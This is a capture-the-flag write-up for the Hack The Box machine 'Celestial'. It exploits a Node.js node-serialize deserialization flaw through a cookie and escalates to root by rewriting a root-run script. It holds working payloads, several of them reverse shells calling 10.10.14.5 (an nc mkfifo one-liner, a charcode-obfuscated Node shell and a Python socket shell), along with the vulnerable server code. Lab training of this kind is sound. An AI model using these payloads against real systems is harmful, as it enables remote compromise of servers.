## Celestial

https://app.hackthebox.com/machines/Celestial

### User Access

Ports: 10.10.10.85:3000, Node.js Express framework.

JWT Cookie:
```
{
  "username": "Dummy",
  "country": "Idk Probably Somewhere Dumb",
  "city": "Lametown",
  "num": "2",
  "alg": "HS256"
}
```

Changing "num" to "3", we get this error:
```
SyntaxError: Unexpected token {
    at Object.parse (native)
    at Object.exports.unserialize (/home/sun/node_modules/node-serialize/lib/serialize.js:62:16)
    at /home/sun/server.js:11:24
    at Layer.handle [as handle_request] (/home/sun/node_modules/express/lib/router/layer.js:95:5)
    at next (/home/sun/node_modules/express/lib/router/route.js:137:13)
    at Route.dispatch (/home/sun/node_modules/express/lib/router/route.js:112:3)
    at Layer.handle [as handle_request] (/home/sun/node_modules/express/lib/router/layer.js:95:5)
    at /home/sun/node_modules/express/lib/router/index.js:281:22
    at Function.process_params (/home/sun/node_modules/express/lib/router/index.js:335:12)
    at next (/home/sun/node_modules/express/lib/router/index.js:275:10)
```

Searching for NodeJS deserialization, we find two blogs:  
[Insecure Deserialization on NodeJS for RCE](https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/)  
[Node JS Insecure Deserialization](https://medium.com/@chaudharyaditya/insecure-deserialization-3035c6b5766e)  

On the last blog, we see how to execute RCE.
```
# Normal request
{ "username": "Aditya", "country": "india", "city": "Delhi" }

# Payload
{"username": "_$$ND_FUNC$$_function (){ return 'hi'; }()" ,"country":"india","city":"Delhi"}
```

Our exploit:
```
# Normal request
{"username":"Dummy","country":"Idk Probably Somewhere Dumb","city": "Lametown","num": "2"}

# Payload
{"username": "_$$ND_FUNC$$_function (){ return 'hi'; }()","country": "Idk Probably Somewhere Dumb","city": "Lametown","num": "2"}
```

<br>

We can use this script to generate serialized payloads:
```javascript
var serialize = require('node-serialize');

/* # Testing
x = {
test : function(){ return 'hi'; }
};
*/

// Reverse Shell
x = {
test : function(){
  require('child_process').execSync("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.5 4444 >/tmp/f", function puts(error, stdout, stderr) {});
}
};

console.log("Serialized: \n" + serialize.serialize(x));
```

This is the output:
```
{"test":"_$$ND_FUNC$$_function(){\n  require('child_process').execSync(\"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.5 4444 >/tmp/f\", function puts(error, stdout, stderr) {});\n}"}
```

BUT, we need to add "()" to the payload for the function execute itself as explained on the first blog.

Final payload:
```
{"username": "_$$ND_FUNC$$_function(){\n  require('child_process').execSync(\"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.5 4444 >/tmp/f\", function puts(error, stdout, stderr) {});\n }()","country": "Idk Probably Somewhere Dumb","city": "Lametown","num": "2"}
```

On the walkthrough, this payloads works as well:
```
{"username":"_$$ND_FUNC$$_require('child_process').exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.5 1234 >/tmp/f', function(error, stdout, stderr) {console.log(stdout) })","country":"Lameville","city":"Lametown","num":"2"}
```

<br>

#### Extra
You can use [nodejsshell](https://github.com/ajinabraham/Node.Js-Security-Course/blob/master/nodejsshell.py) to generate a more stable reverse shell in node.
```python
python2 nodejsshell.py 10.10.14.5 4444
```

Put the output on cookie and add IIFE brackets () after the function.
```
# Payload
{"rce":"_$$ND_FUNC$$_function (){OUTPUT}()"}

# Cookie
{"username":"_$$ND_FUNC$$_function (){OUTPUT}()","country":"Idk Probably Somewhere Dumb","city": "Lametown","num": "2"}

# Example
{"username":"_$$ND_FUNC$$_function (){eval(String.fromCharCode(10,118,97,114,32,110,101,116,32,61,32,114,101,113,117,105,114,101,40,39,110,101,116,39,41,59,10,118,97,114,32,115,112,97,119,110,32,61,32,114,101,113,117,105,114,101,40,39,99,104,105,108,100,95,112,114,111,99,101,115,115,39,41,46,115,112,97,119,110,59,10,72,79,83,84,61,34,49,48,46,49,48,46,49,52,46,53,34,59,10,80,79,82,84,61,34,52,52,52,52,34,59,10,84,73,77,69,79,85,84,61,34,53,48,48,48,34,59,10,105,102,32,40,116,121,112,101,111,102,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,61,61,32,39,117,110,100,101,102,105,110,101,100,39,41,32,123,32,83,116,114,105,110,103,46,112,114,111,116,111,116,121,112,101,46,99,111,110,116,97,105,110,115,32,61,32,102,117,110,99,116,105,111,110,40,105,116,41,32,123,32,114,101,116,117,114,110,32,116,104,105,115,46,105,110,100,101,120,79,102,40,105,116,41,32,33,61,32,45,49,59,32,125,59,32,125,10,102,117,110,99,116,105,111,110,32,99,40,72,79,83,84,44,80,79,82,84,41,32,123,10,32,32,32,32,118,97,114,32,99,108,105,101,110,116,32,61,32,110,101,119,32,110,101,116,46,83,111,99,107,101,116,40,41,59,10,32,32,32,32,99,108,105,101,110,116,46,99,111,110,110,101,99,116,40,80,79,82,84,44,32,72,79,83,84,44,32,102,117,110,99,116,105,111,110,40,41,32,123,10,32,32,32,32,32,32,32,32,118,97,114,32,115,104,32,61,32,115,112,97,119,110,40,39,47,98,105,110,47,115,104,39,44,91,93,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,119,114,105,116,101,40,34,67,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,112,105,112,101,40,115,104,46,115,116,100,105,110,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,111,117,116,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,115,116,100,101,114,114,46,112,105,112,101,40,99,108,105,101,110,116,41,59,10,32,32,32,32,32,32,32,32,115,104,46,111,110,40,39,101,120,105,116,39,44,102,117,110,99,116,105,111,110,40,99,111,100,101,44,115,105,103,110,97,108,41,123,10,32,32,32,32,32,32,32,32,32,32,99,108,105,101,110,116,46,101,110,100,40,34,68,105,115,99,111,110,110,101,99,116,101,100,33,92,110,34,41,59,10,32,32,32,32,32,32,32,32,125,41,59,10,32,32,32,32,125,41,59,10,32,32,32,32,99,108,105,101,110,116,46,111,110,40,39,101,114,114,111,114,39,44,32,102,117,110,99,116,105,111,110,40,101,41,32,123,10,32,32,32,32,32,32,32,32,115,101,116,84,105,109,101,111,117,116,40,99,40,72,79,83,84,44,80,79,82,84,41,44,32,84,73,77,69,79,85,84,41,59,10,32,32,32,32,125,41,59,10,125,10,99,40,72,79,83,84,44,80,79,82,84,41,59,10))}()","country":"Idk Probably Somewhere Dumb","city": "Lametown","num": "2"}
```

The root cause is that it was using `eval()` internally for deserialization.
```node
var express = require('express');
var cookieParser = require('cookie-parser');
var escape = require('escape-html');
var serialize = require('node-serialize');
var app = express();
app.use(cookieParser())
 
app.get('/', function(req, res) {
 if (req.cookies.profile) {
   var str = new Buffer(req.cookies.profile, 'base64').toString();
   var obj = serialize.unserialize(str);
   if (obj.username) { 
     var sum = eval(obj.num + obj.num);
     res.send("Hey " + obj.username + " " + obj.num + " + " + obj.num + " is " + sum);
   }else{
     res.send("An error occurred...invalid username type"); 
   }
}else {
     res.cookie('profile', "eyJ1c2VybmFtZSI6IkR1bW15IiwiY291bnRyeSI6IklkayBQcm9iYWJseSBTb21ld2hlcmUgRHVtYiIsImNpdHkiOiJMYW1ldG93biIsIm51bSI6IjIifQ==", {
       maxAge: 900000,
       httpOnly: true
     });
 }
 res.send("<h1>404</h1>");
});
app.listen(3000);
```

<br>

### Privilege Escalation
Groups:  
`uid=1000(sun)gid=1000(sun)groups=1000(sun),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)`

Being part of adm group, we can search for logs.

On /var/log/syslog, we see that root is executing a script that we have write permissions.
```
python /home/sun/Documents/script.py > /home/sun/output.txt; cp /root/script.py /home/sun/Documents/script.py; chown sun:sun /home/sun/Documents/script.py; chattr -i /home/sun/Documents/script.py; touch -d "$(date -R -r /home/sun/Documents/user.txt)" /home/sun/Documents/script.py
```

Edit script.py to a reverse shell.
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.5",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")
```
